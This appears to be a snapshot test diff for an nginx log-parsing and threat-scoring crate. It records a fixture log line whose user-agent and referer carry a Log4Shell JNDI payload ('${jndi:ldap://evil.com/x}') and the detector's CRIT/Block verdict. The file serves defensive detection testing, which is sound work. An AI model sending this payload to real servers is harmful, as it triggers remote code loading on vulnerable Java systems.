@@ -1,0 +1,16 @@
+---
+source: crates/sentry-source-nginx/tests/snapshots.rs
+expression: summary
+---
+fixture: log4shell
+line:    198.51.100.27 - - [10/Jan/2026:13:55:41 +0000] "GET / HTTP/1.1" 200 128 "${jndi:ldap://evil.com/x}" "${jndi:ldap://evil.com/x}"
+method:  Some(Get)
+path:    /
+query:   -
+status:  200
+ua:      ${jndi:ldap://evil.com/x}
+score:   88
+level:   CRIT
+verdict: Block
+rule:    -
+signals: [log4shell, unknown_route]
